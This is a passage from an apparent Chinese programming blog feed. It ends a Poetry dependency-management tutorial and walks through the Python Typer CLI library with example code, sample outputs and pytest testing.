class="line"><span class="hljs-section">[tool.poetry.scripts]</span> <span class="hljs-comment"># 安装后脚本启动程序。 </span></span><span class="line"><span class="hljs-attr">elin-portal-gun</span> = <span class="hljs-string">&quot;elin_portal_gun.main:app&quot;</span> <span class="hljs-comment">#脚本elin-portal-gun执行时会去找elin_portal_gun包中的main文件执行app()</span></span><span class="line"></br></span><span class="line"><span class="hljs-section">[tool.poetry.dependencies]</span>  <span class="hljs-comment"># 依赖包</span></span><span class="line"><span class="hljs-attr">python</span> = <span class="hljs-string">&quot;^3.8&quot;</span></span><span class="line"><span class="hljs-attr">typer</span> = &#123;extras = [<span class="hljs-string">&quot;all&quot;</span>], version = <span class="hljs-string">&quot;^0.4.0&quot;</span>&#125;</span><span class="line"></br></span><span class="line"><span class="hljs-section">[tool.poetry.dev-dependencies]</span> <span class="hljs-comment"># 开发依赖包</span></span><span class="line"><span class="hljs-attr">pytest</span> = <span class="hljs-string">&quot;^5.2&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-section">[tool.poetry.extras]</span> <span class="hljs-comment"># 可选依赖，增强包等</span></span><span class="line"><span class="hljs-attr">mysql</span> = [<span class="hljs-string">&quot;mysqlclient&quot;</span>]</span><span class="line"><span class="hljs-attr">pgsql</span> = [<span class="hljs-string">&quot;psycopg2&quot;</span>]</span><span class="line"></br></span><span class="line"><span class="hljs-section">[tool.poetry.urls]</span> <span class="hljs-comment"># 任何URL，当发布时会放在 Project Links 下面</span></span><span class="line"><span class="hljs-attr">&quot;Bug Tracker&quot;</span> = <span class="hljs-string">&quot;https://...&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-section">[build-system]</span> <span class="hljs-comment"># 构建Python项目的标准方法</span></span><span class="line"><span class="hljs-attr">requires</span> = [<span class="hljs-string">&quot;poetry-core&gt;=1.0.0&quot;</span>]</span><span class="line"><span class="hljs-attr">build-backend</span> = <span class="hljs-string">&quot;poetry.core.masonry.api&quot;</span></span></code></pre></div></div><h3 id="激活虚拟环境"><a href="#激活虚拟环境" class="headerlink" title="激活虚拟环境"></a>激活虚拟环境</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry shell</span></code></pre></div></div><h3 id="执行脚本"><a href="#执行脚本" class="headerlink" title="执行脚本"></a>执行脚本</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry run python app.py</span></code></pre></div></div><h3 id="安装包"><a href="#安装包" class="headerlink" title="安装包"></a>安装包</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry add typer[all]</span><span class="line">poetry add pytest --dev  <span class="hljs-comment"># 开发依赖</span></span></code></pre></div></div><h3 id="追踪-amp-更新包"><a href="#追踪-amp-更新包" class="headerlink" title="追踪 &amp; 更新包"></a>追踪 &amp; 更新包</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry show</span><span class="line">poetry show --tree <span class="hljs-comment"># 查看依赖关系</span></span><span class="line">poetry show --outdated <span class="hljs-comment"># 查看可以更新的依赖</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry update <span class="hljs-comment"># 更新所有锁定版本的依赖</span></span><span class="line">poetry update dep_name <span class="hljs-comment"># 更新某个指定的依赖</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry remove dep_name <span class="hljs-comment"># 卸载包</span></span></code></pre></div></div><h3 id="切换python版本"><a href="#切换python版本" class="headerlink" title="切换python版本"></a>切换python版本</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry env use python3.8</span></code></pre></div></div><h3 id="安装项目"><a href="#安装项目" class="headerlink" title="安装项目"></a>安装项目</h3><p>根据<code>pyproject.toml</code>安装项目</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry install</span></code></pre></div></div><h3 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry build</span></code></pre></div></div><h3 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry publish</span><span class="line">poetry publish --build <span class="hljs-comment"># 发布前先构建</span></span></code></pre></div></div><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>查看config配置</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry config --list</span></code></pre></div></div><p>要发布到pipy，可以先获取<a href="https://pypi.org/manage/account/token/">Token</a></p><p>token 就像下面这样:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">pypi</span>-wubalubadubdub-deadbeef<span class="hljs-number">1234</span></span></code></pre></div></div><p>然后写入到poetry</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">poetry config pypi-token.pypi pypi-wubalubadubdub-deadbeef1234</span></code></pre></div></div><p>然后就可以直接发布了</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python typer 库使用指南</title>
      <link href="/2022/02/23/python-typer-%E5%BA%93%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2022/02/23/python-typer-%E5%BA%93%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p><code>click</code>是<code>Argparse</code>的升级版，而<code>typer</code>则是<code>click</code>的升级版，其中最大的优势就是可以通过参数的类型识别来快速建立CLI。</p><h2 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">import typer</span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">firstname:</span> str,  <span class="hljs-comment"># 简单的参数，默认等同于 firstname: str = typer.Argument(...)</span></span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">lastname:</span> str = typer.Argument(..., help=<span class="hljs-string">&quot;Lastname&quot;</span>)</span></span>,  <span class="hljs-comment"># ... 表示必选， 虽然 Argument 本身就是必选</span></span><span class="line">    <span class="hljs-symbol">email:</span> str = typer.Option(..., <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;--email&#x27;</span>,    <span class="hljs-comment"># Option 为可选参数， ... 表示这个可选参数为必选项, 后面可跟缩写和非缩写的参数名</span></span><span class="line">                              prompt=<span class="hljs-string">&quot;Please enter your email&quot;</span>),  <span class="hljs-comment"># prompt 为提示信息, 如果没有明确指定，则会弹出提示要求输入</span></span><span class="line">    <span class="hljs-comment"># 类型为int，所以可以指定最小值和最大值, clamp 表示超出了就按照最大值或最小值来处理</span></span><span class="line">    <span class="hljs-symbol">age:</span> int = typer.Option(None, <span class="hljs-string">&#x27;-a&#x27;</span>, <span class="hljs-string">&#x27;--age&#x27;</span>, min=<span class="hljs-number">1</span>, max=<span class="hljs-number">100</span>, clamp=True)</span><span class="line">):</span><span class="line">    <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span></span><span class="line"><span class="hljs-string">    Say hello to someone.</span></span><span class="line"><span class="hljs-string">    &quot;</span><span class="hljs-string">&quot;&quot;</span></span><span class="line">    <span class="hljs-comment"># 上方为CLI的描述, 会自动放入帮助信息</span></span><span class="line">    print(f<span class="hljs-string">&quot;Hello &#123;firstname&#125; &#123;lastname&#125;&quot;</span>)</span><span class="line">    print(f<span class="hljs-string">&#x27;Your email is &#123;email&#125;&#x27;</span>)</span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-symbol">age:</span></span><span class="line">        print(f<span class="hljs-string">&#x27;Your age is &#123;age&#125;&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    typer.run(main)  <span class="hljs-comment"># 运行主函数</span></span></code></pre></div></div><p>可以看到，当只需要一个主命令的时候，那么使用<code>typer.run(main)</code>会非常方便。</p><p>参数有两种<code>typer.Argument</code> 和 <code>typer.Option</code></p><p>输出结果：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-vim codeBlockLines"><span class="line">&gt; <span class="hljs-keyword">python</span> .\<span class="hljs-number">1</span>.<span class="hljs-keyword">py</span> --<span class="hljs-keyword">help</span></span><span class="line">Usage: <span class="hljs-number">1</span>.<span class="hljs-keyword">py</span> [OPTIONS] FIRSTNAME LASTNAME</span><span class="line"></br></span><span class="line">  Say hello <span class="hljs-keyword">to</span> someone.</span><span class="line"></br></span><span class="line">Argument<span class="hljs-variable">s:</span></span><span class="line">  FIRSTNAME  [required]</span><span class="line"></br></span><span class="line">Option<span class="hljs-variable">s:</span></span><span class="line">  -<span class="hljs-keyword">e</span>, --email TEXT         [required]</span><span class="line">  --install-completion     Install completion <span class="hljs-keyword">for</span> the current <span class="hljs-keyword">shell</span>.</span><span class="line">  --show-completion        Show completion <span class="hljs-keyword">for</span> the current <span class="hljs-keyword">shell</span>, <span class="hljs-keyword">to</span> <span class="hljs-keyword">copy</span> it</span><span class="line">                           <span class="hljs-built_in">or</span> customize the installation.</span><span class="line">  --<span class="hljs-keyword">help</span>                   Show this message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span>.</span><span class="line"></br></span><span class="line">&gt; <span class="hljs-keyword">python</span> .\<span class="hljs-number">1</span>.<span class="hljs-keyword">py</span> Fried Pei </span><span class="line">Please enter your emai<span class="hljs-variable">l:</span> <span class="hljs-number">365433079</span>@qq.<span class="hljs-keyword">com</span></span><span class="line">Hello Fried Pei</span><span class="line">Your email <span class="hljs-keyword">is</span> <span class="hljs-number">365433079</span>@qq.<span class="hljs-keyword">com</span></span><span class="line"></br></span><span class="line">&gt; <span class="hljs-keyword">python</span> .\<span class="hljs-number">1</span>.<span class="hljs-keyword">py</span> Fried Pei --age <span class="hljs-number">28</span> --email <span class="hljs-number">365433079</span>@qq.<span class="hljs-keyword">com</span>  </span><span class="line">Hello Fried Pei</span><span class="line">Your email <span class="hljs-keyword">is</span> <span class="hljs-number">365433079</span>@qq.<span class="hljs-keyword">com</span></span><span class="line">Your age <span class="hljs-keyword">is</span> <span class="hljs-number">28</span></span></code></pre></div></div><h2 id="当有多个子命令时"><a href="#当有多个子命令时" class="headerlink" title="当有多个子命令时"></a>当有多个子命令时</h2><p>比如使用<code>git</code>的时候，既可以直接使用也可以<code>git push --all</code> 这样的命令</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">import typer</span><span class="line"></br></span><span class="line">app = typer.Typer()  <span class="hljs-comment"># 初始化app</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># callback 为主命令</span></span><span class="line"><span class="hljs-comment"># invoke_without_command 当没有子命令时也可以执行</span></span><span class="line"><span class="hljs-variable">@app</span>.callback(invoke_without_command=True)</span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">ctx:</span> typer.Context,  <span class="hljs-comment"># 上下文，放在第一个</span></span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">verbose:</span> int = typer.Option(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        <span class="hljs-number">0</span>, <span class="hljs-string">&quot;--verbose&quot;</span>, <span class="hljs-string">&quot;-v&quot;</span>, help=<span class="hljs-string">&#x27;Verbosity level(1-3)&#x27;</span>,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        count=True, show_default=False)</span></span>,  <span class="hljs-comment"># 进行计数， 并且不显示默认值</span></span><span class="line">):</span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-symbol">verbose:</span></span><span class="line">        print(<span class="hljs-string">&quot;verbose level: &#123;&#125;&quot;</span>.format(verbose))</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">if</span> ctx.invoked_subcommand is <span class="hljs-symbol">None:</span>  <span class="hljs-comment"># 当没有子命令时执行</span></span><span class="line">        print(<span class="hljs-string">&quot;Run main process&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># command 为子命令</span></span><span class="line"><span class="hljs-variable">@app</span>.command()</span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">push</span><span class="hljs-params">(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">ctx:</span> typer.Context,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">all:</span> bool = typer.Option(False, <span class="hljs-string">&quot;--all&quot;</span>, <span class="hljs-string">&quot;-a&quot;</span>, help=<span class="hljs-string">&quot;Push all&quot;</span>)</span></span></span><span class="line">):</span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-symbol">all:</span></span><span class="line">        print(<span class="hljs-string">&quot;push all&quot;</span>)</span><span class="line">        raise typer.Exit()  <span class="hljs-comment"># 主动退出  还有一种 typer.Abort() 会有提示 Abort!</span></span><span class="line"></br></span><span class="line">    print(<span class="hljs-string">&quot;push&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><span class="line">    app()  <span class="hljs-comment"># 启动app, 去找 callback 装饰的函数</span></span></code></pre></div></div><p>可以看使用<code>app()</code>最本质的做法是<code>typer.Typer()</code>, 并且对主命令使用<code>@callback</code> 对子命令使用<code>command</code><br>另外<code>typer.Context</code>储存着上下文变量， <code>typer.Context.invoke_without_command</code>为查看是否有子命令</p><p>输出为：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-vim codeBlockLines"><span class="line">&gt; <span class="hljs-keyword">python</span> .\<span class="hljs-number">2</span>.<span class="hljs-keyword">py</span> --<span class="hljs-keyword">help</span>    </span><span class="line">Usage: <span class="hljs-number">2</span>.<span class="hljs-keyword">py</span> [OPTIONS] COMMAND [ARGS]...</span><span class="line"></br></span><span class="line">  -v, --<span class="hljs-keyword">verbose</span>         Verbosity level(<span class="hljs-number">1</span>-<span class="hljs-number">3</span>)</span><span class="line">  --install-completion  Install completion <span class="hljs-keyword">for</span> the current <span class="hljs-keyword">shell</span>.</span><span class="line">  --show-completion     Show completion <span class="hljs-keyword">for</span> the current <span class="hljs-keyword">shell</span>, <span class="hljs-keyword">to</span> <span class="hljs-keyword">copy</span> it <span class="hljs-built_in">or</span></span><span class="line">                        customize the installation.</span><span class="line">  --<span class="hljs-keyword">help</span>                Show this message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span>.</span><span class="line"></br></span><span class="line">  push</span><span class="line"></br></span><span class="line">&gt; <span class="hljs-keyword">python</span> .\<span class="hljs-number">2</span>.<span class="hljs-keyword">py</span> -vv</span><span class="line"><span class="hljs-keyword">verbose</span> leve<span class="hljs-variable">l:</span> <span class="hljs-number">2</span></span><span class="line">Run main process</span><span class="line"></br></span><span class="line">&gt; <span class="hljs-keyword">python</span> .\<span class="hljs-number">2</span>.<span class="hljs-keyword">py</span> push --<span class="hljs-keyword">all</span></span><span class="line">push <span class="hljs-keyword">all</span></span></code></pre></div></div><h2 id="callback-参数调用函数"><a href="#callback-参数调用函数" class="headerlink" title="callback 参数调用函数"></a>callback 参数调用函数</h2><p>比如需要看 banner，或者 version 的时候，写在主函数里面难免有些臃肿，那么单独取一个回调会好很多</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">import typer</span><span class="line"></br></span><span class="line">app = typer.Typer()</span><span class="line">state = &#123;<span class="hljs-string">&quot;verbose&quot;</span>: False&#125;</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dis_version</span><span class="hljs-params">(<span class="hljs-symbol">display:</span> bool)</span></span>:</span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-symbol">display:</span></span><span class="line">        print(<span class="hljs-string">&#x27;Version 0.0.1&#x27;</span>)</span><span class="line">        raise typer.Exit() <span class="hljs-comment"># 显示完后退出</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-variable">@app</span>.callback(invoke_without_command=True)</span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-symbol">ctx:</span> typer.Context,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">         <span class="hljs-symbol">verbose:</span> bool = False,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">         <span class="hljs-symbol">version:</span> bool = typer.Option(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">             False, <span class="hljs-string">&quot;--version&quot;</span>, <span class="hljs-string">&quot;-v&quot;</span>, help=<span class="hljs-string">&quot;Show version&quot;</span>,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">             callback=dis_version, is_eager=True)</span></span>,  <span class="hljs-comment"># 调用 dis_version 函数， 并且优先级最高(is_eager)</span></span><span class="line">         ):</span><span class="line">    <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span></span><span class="line"><span class="hljs-string">    Manage users in the awesome CLI app.</span></span><span class="line"><span class="hljs-string">    &quot;</span><span class="hljs-string">&quot;&quot;</span></span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-symbol">verbose:</span></span><span class="line">        typer.echo(<span class="hljs-string">&quot;Will write verbose output&quot;</span>)</span><span class="line">        state[<span class="hljs-string">&quot;verbose&quot;</span>] = True</span><span class="line"></br></span><span class="line">    typer.confirm(<span class="hljs-string">&quot;Are you sure?&quot;</span>, default=True, abort=True)  <span class="hljs-comment"># 给出选项，abort选项表示 No 则直接中断</span></span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">if</span> ctx.invoked_subcommand is <span class="hljs-symbol">None:</span></span><span class="line">        print(<span class="hljs-string">&#x27;main process&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><span class="line">    app()</span></code></pre></div></div><h2 id="get-app-dir-取配置文件夹路径"><a href="#get-app-dir-取配置文件夹路径" class="headerlink" title="get_app_dir 取配置文件夹路径"></a>get_app_dir 取配置文件夹路径</h2><p>定义如下</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_app_dir</span>(<span class="hljs-params">app_name, roaming=<span class="hljs-literal">True</span>, force_posix=<span class="hljs-literal">False</span></span>):</span></span><span class="line">    <span class="hljs-string">r&quot;&quot;&quot;Returns the config folder for the application.  The default behavior</span></span><span class="line"><span class="hljs-string">    is to return whatever is most appropriate for the operating system.</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">    To give you an idea, for an app called ``&quot;Foo Bar&quot;``, something like</span></span><span class="line"><span class="hljs-string">    the following folders could be returned:</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">    Mac OS X:</span></span><span class="line"><span class="hljs-string">      ``~/Library/Application Support/Foo Bar``</span></span><span class="line"><span class="hljs-string">    Mac OS X (POSIX):</span></span><span class="line"><span class="hljs-string">      ``~/.foo-bar``</span></span><span class="line"><span class="hljs-string">    Unix:</span></span><span class="line"><span class="hljs-string">      ``~/.config/foo-bar``</span></span><span class="line"><span class="hljs-string">    Unix (POSIX):</span></span><span class="line"><span class="hljs-string">      ``~/.foo-bar``</span></span><span class="line"><span class="hljs-string">    Win XP (roaming):</span></span><span class="line"><span class="hljs-string">      ``C:\Documents and Settings\&lt;user&gt;\Local Settings\Application Data\Foo Bar``</span></span><span class="line"><span class="hljs-string">    Win XP (not roaming):</span></span><span class="line"><span class="hljs-string">      ``C:\Documents and Settings\&lt;user&gt;\Application Data\Foo Bar``</span></span><span class="line"><span class="hljs-string">    Win 7 (roaming):</span></span><span class="line"><span class="hljs-string">      ``C:\Users\&lt;user&gt;\AppData\Roaming\Foo Bar``</span></span><span class="line"><span class="hljs-string">    Win 7 (not roaming):</span></span><span class="line"><span class="hljs-string">      ``C:\Users\&lt;user&gt;\AppData\Local\Foo Bar``</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">    .. versionadded:: 2.0</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">    :param app_name: the application name.  This should be properly capitalized</span></span><span class="line"><span class="hljs-string">                     and can contain whitespace.</span></span><span class="line"><span class="hljs-string">    :param roaming: controls if the folder should be roaming or not on Windows.</span></span><span class="line"><span class="hljs-string">                    Has no affect otherwise.</span></span><span class="line"><span class="hljs-string">    :param force_posix: if this is set to `True` then on any POSIX system the</span></span><span class="line"><span class="hljs-string">                        folder will be stored in the home folder with a leading</span></span><span class="line"><span class="hljs-string">                        dot instead of the XDG config home or darwin&#x27;s</span></span><span class="line"><span class="hljs-string">                        application support folder.</span></span><span class="line"><span class="hljs-string">    &quot;&quot;&quot;</span></span></code></pre></div></div><p>使用：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> typer</span><span class="line"></br></span><span class="line">APP_NAME = <span class="hljs-string">&#x27;cmder&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span></span><span class="line">    app_dir = typer.get_app_dir(APP_NAME, force_posix=<span class="hljs-literal">True</span>)</span><span class="line">    config_path: Path = Path(app_dir) / <span class="hljs-string">&quot;config.json&quot;</span></span></code></pre></div></div><h2 id="参数类型"><a href="#参数类型" class="headerlink" title="参数类型"></a>参数类型</h2><h3 id="int"><a href="#int" class="headerlink" title="int"></a>int</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">id:</span> int = typer.Argument(..., min=<span class="hljs-number">0</span>, max=<span class="hljs-number">1000</span>)</span></span>,</span><span class="line">    <span class="hljs-symbol">rank:</span> int = typer.Option(<span class="hljs-number">0</span>, max=<span class="hljs-number">10</span>, clamp=True),</span><span class="line">    <span class="hljs-symbol">score:</span> float = typer.Option(<span class="hljs-number">0</span>, min=<span class="hljs-number">0</span>, max=<span class="hljs-number">100</span>, clamp=True),</span><span class="line">)<span class="hljs-symbol">:</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-symbol">verbose:</span> int = typer.Option(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;--verbose&quot;</span>, <span class="hljs-string">&quot;-v&quot;</span>, count=True)</span></span>)<span class="hljs-symbol">:</span></span></code></pre></div></div><ul><li>min 最小值</li><li>max 最大值</li><li>clamp 超出值后按最小/大处理</li><li>count 计数</li></ul><h3 id="bool"><a href="#bool" class="headerlink" title="bool"></a>bool</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-symbol">accept:</span> Optional[bool] = typer.Option(None, <span class="hljs-string">&quot;--accept/--reject&quot;</span>, <span class="hljs-string">&quot;-a/-A&quot;</span>)</span></span>)<span class="hljs-symbol">:</span></span></code></pre></div></div><p>默认情况下给出的参考值是<code>--accept/--no-accept</code> 修改成<code>--accept/--reject</code> 和 短命令 <code>-a/-A</code></p><h3 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h3><p>只区枚举中的值</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">from enum import Enum</span><span class="line"></br></span><span class="line">import typer</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NeuralNetwork</span>(<span class="hljs-title">str</span>, <span class="hljs-title">Enum</span>):</span></span><span class="line">    simple = <span class="hljs-string">&quot;simple&quot;</span></span><span class="line">    conv = <span class="hljs-string">&quot;conv&quot;</span></span><span class="line">    lstm = <span class="hljs-string">&quot;lstm&quot;</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-symbol">network:</span> NeuralNetwork = typer.Option(NeuralNetwork.simple, case_sensitive=False)</span></span>):</span><span class="line">    typer.echo(f<span class="hljs-string">&quot;Training neural network of type: &#123;network.value&#125;&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><span class="line">    typer.run(main)</span></code></pre></div></div><ul><li>case_sensitive 大小写敏感</li></ul><h3 id="path"><a href="#path" class="headerlink" title="path"></a>path</h3><p>可以直接对路径进行验证</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">import typer</span><span class="line">from pathlib import Path</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    <span class="hljs-symbol">config:</span> Path = typer.Option(</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        ...,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        exists=True,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        file_okay=True,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        dir_okay=False,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        writable=False,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        readable=True,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">        resolve_path=True,</span></span></span><span class="line"><span class="hljs-params"><span class="hljs-function">    )</span></span></span><span class="line">):</span><span class="line">    text = config.read_text(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)</span><span class="line">    typer.echo(f<span class="hljs-string">&quot;Config file contents: &#123;text&#125;&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><span class="line">    typer.run(main)</span></code></pre></div></div><ul><li>exists 是否存在</li><li>file_okay 可以是文件</li><li>dir_okay 可以是文件夹</li><li>writable 是否可写</li><li>readable 是否可读</li><li>resolve_path 当为True，则会转化成绝对路径</li></ul><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>可以直接返回一个<code>fi</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">config: typer.FileText = typer.Option(<span class="hljs-params">..., mode=<span class="hljs-string">&quot;a&quot;</span></span>)</span>):</span></span><span class="line">    config.write(<span class="hljs-string">&#x27;This is a single line\n&#x27;</span>)</span></code></pre></div></div><ul><li>mode 定义操作类型</li></ul><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>可以使用<code>pytest</code>来对<code>typer</code>进行测试</p><h3 id="测试输出"><a href="#测试输出" class="headerlink" title="测试输出"></a>测试输出</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> typer.testing <span class="hljs-keyword">import</span> CliRunner</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> .main <span class="hljs-keyword">import</span> app</span><span class="line"></br></span><span class="line">runner = CliRunner()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_app</span>():</span></span><span class="line">    result = runner.invoke(app, [<span class="hljs-string">&quot;Camila&quot;</span>, <span class="hljs-string">&quot;--city&quot;</span>, <span class="hljs-string">&quot;Berlin&quot;</span>])</span><span class="line">    <span class="hljs-keyword">assert</span> result.exit_code == <span class="hljs-number">0</span></span><span class="line">    <span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;Hello Camila&quot;</span> <span 